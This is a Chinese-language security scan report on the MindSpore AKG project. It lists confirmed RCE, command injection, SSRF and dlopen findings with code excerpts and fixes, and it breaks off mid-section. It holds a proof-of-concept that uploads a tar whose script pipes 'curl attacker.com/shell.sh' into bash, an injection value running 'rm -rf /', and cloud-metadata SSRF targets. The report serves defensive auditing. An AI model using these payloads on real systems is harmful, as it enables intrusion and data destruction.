# 漏洞扫描报告 — 已确认漏洞

**项目**: akg
**扫描时间**: 2026-04-24T03:12:51.692Z
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

本次安全扫描针对 MindSpore AKG（Auto Kernel Generator）项目进行了深度漏洞分析。AKG 是一个 AI 驱动的深度学习算子生成系统，包含 MLIR 编译器框架（C++）和 AI 内核生成器（Python）两个主要子项目。

**核心发现**：该项目存在 **12 个已确认漏洞**（其中 10 个 Critical、2 个 High），主要集中在远程代码执行（RCE）、命令注入和动态库加载三个攻击向量。这些漏洞形成了一条完整的攻击链：从无认证的 HTTP API → tar 包解压 → 任意代码执行 → shell 命令注入 → 动态库代码注入。

**风险评估**：该系统设计上需要接收并执行用户/AI 生成的代码，但缺乏必要的身份认证、输入验证和执行隔离机制。如果部署在公网可访问的环境中，攻击者可通过 HTTP API 直接上传恶意代码包并获取服务器完全控制权。此外，SSRF 漏洞允许攻击者探测内部网络服务或访问云元数据端点。

**紧急建议**：
1. **立即部署网络隔离**：Worker API（端口 9001）应仅允许内部可信网络访问
2. **添加认证机制**：为所有 API 端点添加 Token/API Key 认证
3. **沙箱隔离**：使用容器或沙箱技术隔离代码执行环境
4. **移除 shell=True**：所有 subprocess 调用改为使用参数列表形式

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| CONFIRMED | 12 | 50.0% |
| LIKELY | 9 | 37.5% |
| FALSE_POSITIVE | 2 | 8.3% |
| POSSIBLE | 1 | 4.2% |
| **总计** | **24** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 10 | 83.3% |
| High | 2 | 16.7% |
| **有效漏洞总计** | **12** | - |
| 误报 (FALSE_POSITIVE) | 2 | - |

### 1.3 Top 10 关键漏洞

1. **[SA-001]** code_injection (Critical) - `aikg/python/ai_kernel_generator/worker/server.py:54` @ `verify` | 置信度: 95
2. **[VULN-PY-001]** Remote Code Execution (Critical) - `aikg/python/ai_kernel_generator/core/worker/local_worker.py:89` @ `verify` | 置信度: 95
3. **[SA-004]** command_injection (Critical) - `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:140` @ `run_msprof` | 置信度: 85
4. **[SA-005]** command_injection (Critical) - `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:224` @ `run_nsys` | 置信度: 85
5. **[VULN-PY-003a]** Command Injection (Critical) - `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:140` @ `run_msprof` | 置信度: 85
6. **[VULN-PY-003b]** Command Injection (Critical) - `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:224` @ `run_nsys` | 置信度: 85
7. **[SA-008]** code_injection (Critical) - `akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunch.cpp:149` @ `akg_ascend_run` | 置信度: 75
8. **[SA-009]** code_injection (Critical) - `akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunchRuntime.cpp:168` @ `GetKernelFunc` | 置信度: 75
9. **[VULN-AKG-001]** Code Injection via Dynamic Library Loading (Critical) - `/home/pwn20tty/Desktop/opencode_project/shenteng/mindspore/mindspore/akg/akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunch.cpp:135` @ `akg_ascend_run` | 置信度: 75
10. **[VULN-AKG-002]** Code Injection via Dynamic Library Loading (Critical) - `/home/pwn20tty/Desktop/opencode_project/shenteng/mindspore/mindspore/akg/akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunchRuntime.cpp:168` @ `GetKernelFunc` | 置信度: 75

---

## 2. Top 5 漏洞深度分析

以下对置信度最高的 5 个已确认漏洞进行深度技术分析，包括攻击路径、利用条件和安全影响。

### 2.1 SA-001 & VULN-PY-001: Worker API 无认证 RCE (置信度 95)

**漏洞本质**：这是本次扫描发现的**最高风险漏洞**，位于 Worker 服务的 HTTP API 层。系统设计为接收并执行用户上传的验证包（tar 格式），但完全没有实施任何身份认证或内容验证。

**攻击路径深度分析**：

```
攻击者 → HTTP POST /api/v1/verify → 
  package_data (任意 bytes) → 
  tarfile.extractall(extract_dir) → 
  搜索 verify_{op_name}.py 脚本 → 
  asyncio.create_subprocess_exec(python, script_name) → 
  任意 Python 代码执行
```

**源码关键点**（`worker/server.py:54-89`）：
- FastAPI endpoint 直接接收 `UploadFile`，无认证中间件
- `op_name` 参数来自 HTTP Form，用于构造脚本名称 `verify_{op_name}.py`
- `LocalWorker.verify()` 解压 tar 包后直接执行其中的 Python 脚本

**可利用性评估**：
- **前置条件**：攻击者需能访问 Worker API（默认端口 9001）
- **攻击复杂度**：极低 — 构造恶意 tar 包只需 2 行 Python 代码
- **影响范围**：完全服务器控制（读取敏感数据、安装后门、横向移动）

**攻击示例（概念验证）**：
```python
# 构造恶意验证包
import tarfile, io
payload = io.BytesIO()
with tarfile.open(fileobj=payload, mode='w') as tar:
    # 添加恶意 Python 脚本
    malicious_script = b"import os; os.system('curl attacker.com/shell.sh | bash')"
    info = tarfile.TarInfo(name='verify_malicious.py')
    info.size = len(malicious_script)
    tar.addfile(info, io.BytesIO(malicious_script))
# 发送 HTTP POST
requests.post('http://worker:9001/api/v1/verify',
    files={'package': ('malicious.tar', payload.getvalue())},
    data={'task_id': 'test', 'op_name': 'malicious'})
```

### 2.2 SA-004/SA-005/VULN-PY-003: profiler_utils.py shell=True 命令注入 (置信度 85)

**漏洞本质**：性能分析工具使用 `subprocess.run(shell=True)` 执行系统命令，命令字符串通过 f-string 从 `script_path` 参数构造。由于 `script_path` 的来源可追溯到 HTTP API 的 `op_name` 参数，攻击者可通过注入 shell 元字符执行任意命令。

**攻击路径深度分析**：

```
HTTP POST /api/v1/profile → 
  op_name (Form 参数) → 
  script_name = f"verify_{op_name}.py" → 
  script_path = os.path.join(extract_dir, script_name) → 
  f'msprof --application="python {script_path}"' → 
  subprocess.run(cmd, shell=True) → 
  shell 命令注入
```

**源码关键点**（`profiler_utils.py:140-143`）：
```python
process = subprocess.run(
    f'msprof --application="python {script_path}"',
    shell=True, capture_output=True, text=True, timeout=600
)
```

**注入向量分析**：
- `op_name = "test; rm -rf /"` → `script_path = "/tmp/extract/verify_test; rm -rf /.py"`
- Shell 执行时会解析为两条命令：`msprof ...` 和 `rm -rf /`

**修复难度**：中等 — 需重构所有 profiler 调用，改用参数列表形式

### 2.3 SA-007/VULN-PY-005: Worker 注册 SSRF (置信度 80)

**漏洞本质**：主服务器允许注册远程 Worker，接收任意 URL 作为 Worker 地址。现有检查 `_is_loopback_url()` 仅过滤 localhost/127.0.0.1，未验证私有 IP 范围（10.x、172.16.x、192.168.x）和云元数据端点（169.254.169.254）。

**源码关键点**（`server/app.py:99-117`）：
```python
def _is_loopback_url(url: str) -> bool:
    loopback_patterns = ["localhost", "127.0.0.1", "[::1]"]
    return any(pattern in url for pattern in loopback_patterns)

@app.post("/api/v1/workers/register")
async def register_worker(req: WorkerRegisterRequest):
    if _is_loopback_url(req.url):
        logger.warning(...)  # 仅警告，不阻止
    worker = RemoteWorker(req.url)  # 直接创建 RemoteWorker
    await get_worker_manager().register(worker, ...)
```

**攻击场景**：
1. **内部服务探测**：注册 `http://10.0.0.1:80/api` 探测内网服务
2. **云元数据窃取**：注册 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. **端口扫描**：通过响应时间/错误信息推断内部端口开放状态

**修复建议**：添加完整 IP 验证，包括私有 IP 范围和云元数据 IP

### 2.4 SA-008/SA-009: AKGAscendLaunch.cpp dlopen 代码注入 (置信度 75)

**漏洞本质**：MLIR 运行时通过 Python 绑定接收 `path` 和 `kernel_name` 参数，构造共享库路径并通过 `dlopen()` 加载。由于路径来源于外部调用，攻击者可通过前述 RCE 漏洞控制编译输出，注入恶意 .so 文件。

**源码关键点**（`AKGAscendLaunch.cpp:149-154`）：
```cpp
std::string so_path = path + "/lib" + kernel_name + ".so";
void *handle = dlopen(so_path.data(), RTLD_LAZY);
if (!handle) {
    std::cerr << "Failed to load library: " << dlerror() << std::endl;
    return;
}
```

**攻击链组合**：
1. 通过 SA-001 漏洞上传恶意代码包 → 生成恶意 .so 文件到编译输出目录
2. 触发 Ascend 内核运行 → `dlopen()` 加载恶意 .so → 构造函数执行恶意代码

**技术细节**：C++ 共享库的构造函数（`__attribute__((constructor))`）在 `dlopen()` 时自动执行，无需调用任何导出函数。

---

## 3. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `undefined@aikg/python/ai_kernel_generator/worker/server.py` | web_api | - | - | Worker服务API - 接收验证包执行代码 |
| `undefined@aikg/python/ai_kernel_generator/server/app.py` | web_api | - | - | 主服务器API - 作业提交和Worker注册 |
| `undefined@akg-mlir/compiler/tools/ascend-linker/ascend-linker.cpp` | cli_tool | - | - | Ascend内核链接器 - 使用popen执行shell命令 |
| `undefined@akg-mlir/compiler/tools/ptx-tools/ptx-replace.cpp` | cli_tool | - | - | PTX文件处理器 - 文件读写和正则解析 |
| `undefined@akg-mlir/compiler/tools/akg-opt/akg-opt.cpp` | cli_tool | - | - | MLIR优化器CLI - 处理MLIR文件 |
| `undefined@akg-mlir/compiler/tools/akg-translate/akg-translate.cpp` | cli_tool | - | - | MLIR翻译工具 - 转换MLIR到PTX |
| `undefined@akg-mlir/compiler/tools/mindspore-translate/mindspore-translate.cpp` | cli_tool | - | - | MindSpore翻译工具 - JSON到MLIR转换 |
| `undefined@akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunch.cpp` | python_binding | - | - | Python绑定 - dlopen加载用户提供的.so |
| `undefined@aikg/python/ai_kernel_generator/cli/cli.py` | python_cli | - | - | AIKG CLI入口 - Typer框架 |
| `undefined@aikg/python/ai_kernel_generator/resources/skills/kernel-workflow/scripts/check_torch_code.py` | script | - | - | Torch代码验证脚本 - exec执行用户代码 |


---

## 3. Critical 漏洞 (10)

### [SA-001] code_injection - verify

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 95/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `aikg/python/ai_kernel_generator/worker/server.py:54-89` @ `verify`
**模块**: aikg-python

**描述**: Remote Code Execution via Unauthenticated Worker API. The worker/server.py exposes POST endpoints (/api/v1/verify, /api/v1/profile, /api/v1/generate_reference) that accept tar packages containing arbitrary Python code. LocalWorker extracts the package and executes the contained script without any authentication or code validation. An attacker can upload a malicious tar package containing arbitrary Python code, which will be extracted and executed on the worker server.

**漏洞代码** (`aikg/python/ai_kernel_generator/worker/server.py:54-89`)

```c
@app.post("/api/v1/verify")
async def verify(
    package: UploadFile = File(...),
    task_id: str = Form(...),
    op_name: str = Form(...),
    timeout: int = Form(300)
):
    ...
    package_data = await package.read()
    success, log, artifacts = await worker.verify(package_data, task_id, op_name, timeout)
```

**达成路径**

HTTP POST UploadFile → package.read() → worker.verify() → LocalWorker.verify() → tarfile.extractall() → asyncio.create_subprocess_exec(script)

**验证说明**: HTTP POST endpoint /api/v1/verify accepts tar packages without authentication. User uploads package → tarfile.extractall() → asyncio.create_subprocess_exec executes Python script from package. Full attacker control over package content and script content. No mitigations found.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 10

---

### [VULN-PY-001] Remote Code Execution - verify

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 95/100 | **状态**: CONFIRMED | **来源**: python-dataflow-module-scanner

**位置**: `aikg/python/ai_kernel_generator/core/worker/local_worker.py:89-90` @ `verify`
**模块**: aikg-python/worker
**跨模块**: aikg-python/worker → aikg-python/core/worker

**描述**: User-uploaded tar package is extracted and Python scripts are executed without validation. An attacker can upload a malicious tar package containing a Python script that will be automatically executed by the worker service.

**漏洞代码** (`aikg/python/ai_kernel_generator/core/worker/local_worker.py:89-90`)

```c
with tarfile.open(tar_path, 'r') as tar_ref:
    tar_ref.extractall(extract_dir)
```

**达成路径**

[{"step":1,"node":"HTTP POST /api/v1/verify","file":"worker/server.py:54-89","taint_source":"UploadFile package_data"},{"step":2,"node":"LocalWorker.verify","file":"local_worker.py:81-96","operation":"解压tar包到临时目录"},{"step":3,"node":"Script Discovery","file":"local_worker.py:98-102","operation":"查找verify_{op_name}.py脚本"},{"step":4,"node":"Async Subprocess Execution","file":"local_worker.py:111-117","taint_sink":"asyncio.create_subprocess_exec"}]

**验证说明**: Duplicate of SA-001 - Remote Code Execution via unauthenticated Worker API tar package upload. See SA-001 for full analysis.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 10

---

### [SA-004] command_injection - run_msprof

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:140-143` @ `run_msprof`
**模块**: aikg-python

**描述**: Command Injection via shell=True in msprof execution. The profiler_utils.py uses subprocess.run with shell=True to execute msprof commands. The script_path is passed directly to the shell command. While script_path typically comes from trusted sources, if package data is compromised, path traversal or injection could be possible.

**漏洞代码** (`aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:140-143`)

```c
process = subprocess.run(
    f'msprof --application="python {script_path}"',
    shell=True, capture_output=True, text=True, timeout=600
)
```

**达成路径**

script_path → f-string interpolation → subprocess.run(shell=True) → shell command execution

**验证说明**: subprocess.run with shell=True in run_msprof(). The script_path is derived from op_name (Form parameter from HTTP POST). Shell metacharacters in op_name allow command injection: op_name='test; rm -rf /' → script_name='verify_test; rm -rf /.py' → msprof executes 'rm -rf /'. Direct external input via HTTP Form parameter.

**评分明细**: base: 30 | reachability: 30 | controllability: 20 | mitigations: 0 | context: 0 | cross_file: 5

---

### [SA-005] command_injection - run_nsys

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:224-226` @ `run_nsys`
**模块**: aikg-python

**描述**: Command Injection via shell=True in nsys profile execution. The profiler_utils.py uses subprocess.run with shell=True to execute nsys profile commands. The script_path and output_name are constructed and passed to shell.

**漏洞代码** (`aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:224-226`)

```c
cmd = f'nsys profile --output={output_name} python {script_path}'
process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
```

**达成路径**

script_path → f-string interpolation → subprocess.run(shell=True) → shell command execution

**验证说明**: subprocess.run with shell=True in run_nsys(). Similar to SA-004. script_path derived from op_name Form parameter allows shell injection.

**评分明细**: base: 30 | reachability: 30 | controllability: 20 | mitigations: 0 | context: 0 | cross_file: 5

---

### [VULN-PY-003a] Command Injection - run_msprof

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: python-dataflow-module-scanner

**位置**: `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:140-143` @ `run_msprof`
**模块**: aikg-python/core/verifier

**描述**: subprocess.run with shell=True allows command injection. The msprof command string is constructed without proper sanitization, allowing shell metacharacters to inject arbitrary commands.

**漏洞代码** (`aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:140-143`)

```c
process = subprocess.run(
    f'msprof --application="python {script_path}"',
    shell=True, capture_output=True, text=True, timeout=600
)
```

**达成路径**

[{"step":1,"node":"HTTP POST /api/v1/profile","taint_source":"profile_settings JSON"},{"step":2,"node":"run_msprof","operation":"执行msprof命令"},{"step":3,"node":"Shell Command Execution","taint_sink":"subprocess.run(cmd, shell=True)"}]

**验证说明**: Duplicate of SA-004 - Command Injection via shell=True in msprof execution. See SA-004 for full analysis.

**评分明细**: base: 30 | reachability: 30 | controllability: 20 | mitigations: 0 | context: 0 | cross_file: 5

---

### [VULN-PY-003b] Command Injection - run_nsys

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: python-dataflow-module-scanner

**位置**: `aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:224-227` @ `run_nsys`
**模块**: aikg-python/core/verifier

**描述**: subprocess.run with shell=True in nsys profiling allows command injection. The nsys command string is constructed using string formatting without proper sanitization.

**漏洞代码** (`aikg/python/ai_kernel_generator/core/verifier/profiler_utils.py:224-227`)

```c
cmd = f'nsys profile --output={output_name} python {script_path}'
process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
```

**达成路径**

[{"step":1,"node":"HTTP POST /api/v1/profile","taint_source":"script_path from package"},{"step":2,"node":"run_nsys","operation":"构建shell命令"},{"step":3,"node":"Shell Command Execution","taint_sink":"subprocess.run(cmd, shell=True)"}]

**验证说明**: Duplicate of SA-005 - Command Injection via shell=True in nsys execution. See SA-005 for full analysis.

**评分明细**: base: 30 | reachability: 30 | controllability: 20 | mitigations: 0 | context: 0 | cross_file: 5

---

### [SA-008] code_injection - akg_ascend_run

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 75/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunch.cpp:149-154` @ `akg_ascend_run`
**模块**: akg-mlir-compiler

**描述**: dlopen() loads shared object from user-controlled path. The AKGAscendLaunch.cpp uses dlopen() to load shared libraries where the path is constructed from parameters passed from Python (akg_ascend_run function). The 'path' parameter can be controlled by an attacker to load a malicious shared object, leading to arbitrary code execution.

**漏洞代码** (`akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunch.cpp:149-154`)

```c
std::string so_path = path + "/lib" + kernel_name + ".so";
void *handle = dlopen(so_path.data(), RTLD_LAZY);
if (!handle) {
  std::cerr << "Failed to load library: " << dlerror() << std::endl;
  return;
}
```

**达成路径**

Python akg_ascend_run(path, kernel_name) → so_path = path + '/lib' + kernel_name + '.so' → dlopen(so_path) → loads arbitrary .so file

**验证说明**: dlopen() loads .so from path parameter via Python binding. Path comes from compilation output directory. If attacker controls compilation output (via SA-001 attack chain), they could inject malicious .so. Less direct than SA-001 - requires manipulation of compiled library.

**评分明细**: base: 30 | reachability: 20 | controllability: 15 | mitigations: 0 | context: 0 | cross_file: 10

---

### [SA-009] code_injection - GetKernelFunc

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 75/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunchRuntime.cpp:168-179` @ `GetKernelFunc`
**模块**: akg-mlir-compiler

**描述**: dlopen() loads shared object from user-controlled path in GetKernelFunc(). The AKGAscendLaunchRuntime.cpp constructs the shared object path from parameters that ultimately come from Python bindings. An attacker controlling the 'path' argument can load a malicious shared object for code execution.

**漏洞代码** (`akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunchRuntime.cpp:168-179`)

```c
std::string file_str = path + "/lib" + kernel_name + kBinFileSuffix;
void *handle = dlopen(file_str.c_str(), RTLD_LAZY | RTLD_LOCAL);
CHECK(handle != nullptr) << "dlopen failed...";
...
void *func = dlsym(handle, func_str.c_str());
```

**达成路径**

AscendKernelRuntime::RunOpImpl(path, kernel_name) → GetKernelFunc(path, kernel_name) → file_str = path + '/lib' + kernel_name + '.so' → dlopen(file_str) → loads arbitrary .so file

**验证说明**: dlopen() in GetKernelFunc loads .so from path/kernel_name parameters. Similar to SA-008. Part of the Ascend kernel runtime execution chain.

**评分明细**: base: 30 | reachability: 20 | controllability: 15 | mitigations: 0 | context: 0 | cross_file: 10

---

### [VULN-AKG-001] Code Injection via Dynamic Library Loading - akg_ascend_run

**严重性**: Critical | **CWE**: CWE-426 | **置信度**: 75/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `/home/pwn20tty/Desktop/opencode_project/shenteng/mindspore/mindspore/akg/akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunch.cpp:135-154` @ `akg_ascend_run`
**模块**: akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime

**描述**: The akg_ascend_run function accepts a path parameter from Python binding and uses it to construct a dynamic library path for dlopen. An attacker can provide a malicious .so file path to inject and execute arbitrary code.

**漏洞代码** (`/home/pwn20tty/Desktop/opencode_project/shenteng/mindspore/mindspore/akg/akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunch.cpp:135-154`)

```c
std::string so_path = path + "/lib" + kernel_name + ".so"; void *handle = dlopen(so_path.data(), RTLD_LAZY);
```

**达成路径**

[{"step":1,"source":"Python Binding EP-008","node":"akg_ascend_run(std::string path, std::string kernel_name, ...)","taint":"path parameter from Python"},{"step":2,"operation":"Path String Construction","code":"so_path = path + "/lib" + kernel_name + ".so"},{"step":3,"sink":"dlopen(so_path.data(), RTLD_LAZY)","line":150,"type":"Code Injection"}]

**验证说明**: Duplicate of SA-008 - dlopen() loads .so from user-controlled path. See SA-008 for full analysis.

**评分明细**: base: 30 | reachability: 20 | controllability: 15 | mitigations: 0 | context: 0 | cross_file: 10

---

### [VULN-AKG-002] Code Injection via Dynamic Library Loading - GetKernelFunc

**严重性**: Critical | **CWE**: CWE-426 | **置信度**: 75/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `/home/pwn20tty/Desktop/opencode_project/shenteng/mindspore/mindspore/akg/akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunchRuntime.cpp:168-179` @ `GetKernelFunc`
**模块**: akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime

**描述**: GetKernelFunc constructs a file path from user-controlled parameters and uses dlopen to load it. The path parameter flows from RunOpImpl which can be called via Python binding or API, allowing malicious .so loading.

**漏洞代码** (`/home/pwn20tty/Desktop/opencode_project/shenteng/mindspore/mindspore/akg/akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime/AKGAscendLaunchRuntime.cpp:168-179`)

```c
std::string file_str = path + "/lib" + kernel_name + ".so"; void *handle = dlopen(file_str.c_str(), RTLD_LAZY | RTLD_LOCAL);
```

**达成路径**

[{"step":1,"source":"RunOpImpl call","node":"RunOpImpl(path, kernel_name, ...)","taint":"path/kernel_name parameters"},{"step":2,"node":"GetKernelFunc","operation":"file_str = path + "/lib" + kernel_name + kBinFileSuffix"},{"step":3,"sink":"dlopen(file_str.c_str(), RTLD_LAZY | RTLD_LOCAL)","line":171,"type":"Code Injection"}]

**验证说明**: Duplicate of SA-009 - dlopen() in GetKernelFunc. See SA-009 for full analysis.

**评分明细**: base: 30 | reachability: 20 | controllability: 15 | mitigations: 0 | context: 0 | cross_file: 10

---

## 4. High 漏洞 (2)

### [SA-007] ssrf - register_worker

**严重性**: High | **CWE**: CWE-918 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `aikg/python/ai_kernel_generator/server/app.py:99-117` @ `register_worker`
**模块**: aikg-python

**描述**: Server-Side Request Forgery via Worker Registration. The server/app.py allows registration of remote workers with arbitrary URLs. The _is_loopback_url function only logs a warning for loopback URLs but does not block them. Additionally, non-loopback URLs pointing to internal services (e.g., internal cloud metadata endpoints, private IP ranges) are accepted without validation. An attacker can register a malicious worker URL causing the server to make requests to internal services.

**漏洞代码** (`aikg/python/ai_kernel_generator/server/app.py:99-117`)

```c
@app.post("/api/v1/workers/register")
async def register_worker(req: WorkerRegisterRequest):
    if _is_loopback_url(req.url):
        logger.warning(f"Worker registered with loopback URL...")
    worker = RemoteWorker(req.url)
    await get_worker_manager().register(worker, ...)
```

**达成路径**

HTTP POST req.url → RemoteWorker(url) → httpx.AsyncClient → arbitrary URL request

**验证说明**: SSRF via Worker Registration API. POST /api/v1/workers/register accepts arbitrary URL. _is_loopback_url only checks localhost patterns, does NOT validate internal IP ranges (10.x, 172.16.x, 192.168.x) or cloud metadata endpoints (169.254.169.254). Attacker can register malicious worker URL to access internal services.

**评分明细**: base: 30 | reachability: 30 | controllability: 15 | mitigations: -5 | context: 0 | cross_file: 10

---

### [VULN-PY-005] Server-Side Request Forgery - register_worker

**严重性**: High | **CWE**: CWE-918 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: python-dataflow-module-scanner

**位置**: `aikg/python/ai_kernel_generator/server/app.py:99-117` @ `register_worker`
**模块**: aikg-python/server
**跨模块**: aikg-python/server → aikg-python/core/worker

**描述**: The Worker registration API accepts arbitrary URLs without validation. An attacker can register a malicious URL pointing to internal services or SSRF targets, which will then be used for HTTP requests.

**漏洞代码** (`aikg/python/ai_kernel_generator/server/app.py:99-117`)

```c
worker = RemoteWorker(req.url)
await get_worker_manager().register(
    worker, 
    backend=req.backend, 
    arch=req.arch, 
    capacity=req.capacity, 
    tags=set(req.tags)
)
```

**达成路径**

[{"step":1,"node":"HTTP POST /api/v1/workers/register","taint_source":"req.url (Worker URL)"},{"step":2,"node":"RemoteWorker Construction","operation":"Create RemoteWorker with user-provided URL"},{"step":3,"node":"WorkerManager Registration","taint_sink":"URL stored and used for HTTP requests"}]

**验证说明**: Duplicate of SA-007 - SSRF via Worker Registration URL. See SA-007 for full analysis.

**评分明细**: base: 30 | reachability: 30 | controllability: 15 | mitigations: -5 | context: 0 | cross_file: 10

---

## 5. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| aikg-python | 3 | 1 | 0 | 0 | 4 |
| aikg-python/core/verifier | 2 | 0 | 0 | 0 | 2 |
| aikg-python/server | 0 | 1 | 0 | 0 | 1 |
| aikg-python/worker | 1 | 0 | 0 | 0 | 1 |
| akg-mlir-compiler | 2 | 0 | 0 | 0 | 2 |
| akg-mlir/compiler/lib/ExecutionEngine/AscendLaunchRuntime | 2 | 0 | 0 | 0 | 2 |
| **合计** | **10** | **2** | **0** | **0** | **12** |

## 6. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-78 | 5 | 41.7% |
| CWE-94 | 3 | 25.0% |
| CWE-918 | 2 | 16.7% |
| CWE-426 | 2 | 16.7% |

---

## 7. 修复建议

### 7.1 紧急修复（24小时内）

#### 7.1.1 添加 API 认证机制

**针对漏洞**：SA-001, SA-007

**修复方案**：在所有 FastAPI endpoint 添加认证中间件

```python
# server/app.py 和 worker/server.py
from fastapi import Depends, HTTPException, Header
import secrets

API_KEY = os.environ.get("AIKG_API_KEY")

async def verify_api_key(x_api_key: str = Header(...)):
    if not API_KEY or x_api_key != API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    return x_api_key

# 所有 endpoint 添加依赖
@app.post("/api/v1/verify", dependencies=[Depends(verify_api_key)])
async def verify(...):
```

**部署要求**：
- 使用强随机 API Key（至少 32 字节）
- API Key 通过环境变量注入，不写入配置文件
- 考虑使用 JWT/OAuth2 实现更完善的认证体系

#### 7.1.2 网络隔离

**修复方案**：
- Worker API（端口 9001）绑定到 `127.0.0.1`，不监听公网
- 添加防火墙规则，仅允许 Server 内网 IP 访问 Worker
- 使用 TLS 加密 Server-Worker 通信

### 7.2 高优先级修复（1周内）

#### 7.2.1 移除 shell=True

**针对漏洞**：SA-004, SA-005, SA-006

**修复方案**：重构 profiler_utils.py，使用参数列表形式

```python
# 原代码（漏洞）
cmd = f'msprof --application="python {script_path}"'
subprocess.run(cmd, shell=True, ...)

# 修复代码
subprocess.run(
    ["msprof", "--application=python", script_path],
    shell=False, capture_output=True, text=True, timeout=600
)
```

**注意事项**：
- `msprof` 的 `--application` 参数需要特殊处理（可能不支持参数分隔）
- 所有 profiler 工具（msprof、nsys）需逐一修复

#### 7.2.2 添加 SSRF 防护

**针对漏洞**：SA-007

**修复方案**：完善 URL 验证函数

```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url: str) -> bool:
    """验证 URL 是否为安全的公网地址"""
    parsed = urlparse(url)
    
    # 禁止私有 IP 范围
    private_ranges = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('169.254.0.0/16'),  # 云元数据
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('::1/128'),
    ]
    
    try:
        host = parsed.hostname
        if not host:
            return False
        ip = ipaddress.ip_address(host)
        for network in private_ranges:
            if ip in network:
                return False
    except ValueError:
        # hostname 不是 IP，检查域名黑名单
        if host in ['localhost', 'metadata.google.internal', 'metadata.azure.com']:
            return False
    
    return True
```

### 7.3 中等优先级修复（2周内）

#### 7.3.1 代码执行沙箱隔离

**修复方案**：
- 使用 Docker 容器隔离 Worker 执行环境
- 配置容器资源限制（CPU、内存、网络）
- 禁止容器访问宿主机敏感资源

```python
# local_worker.py 修改
async def verify(self, package_data, task_id, op_name, timeout):
    # 在容器中执行
    import docker
    client = docker.from_env()
    container = client.containers.run(
        "akg-worker:latest",
        volumes={extract_dir: {'bind': '/workspace', 'mode': 'rw'}},
        command=f"python verify_{op_name}.py",
        timeout=timeout,
        auto_remove=True,
        network_disabled=True,  # 禁止网络访问
    )
```

#### 7.3.2 tar 包内容验证

**修复方案**：添加包内容白名单验证

```python
def validate_tar_package(tar_path: str) -> bool:
    """验证 tar 包内容是否符合预期"""
    allowed_files = ['verify_', 'profile_', 'config.json', 'data.pt']
    with tarfile.open(tar_path, 'r') as tar:
        for member in tar.getmembers():
            # 检查文件名格式
            if not any(member.name.startswith(prefix) for prefix in allowed_files):
                logger.warning(f"Suspicious file in package: {member.name}")
                return False
            # 检查路径遍历
            if '..' in member.name or member.name.startswith('/'):
                return False
    return True
```

#### 7.3.3 dlopen 路径验证

**针对漏洞**：SA-008, SA-009

**修复方案**：
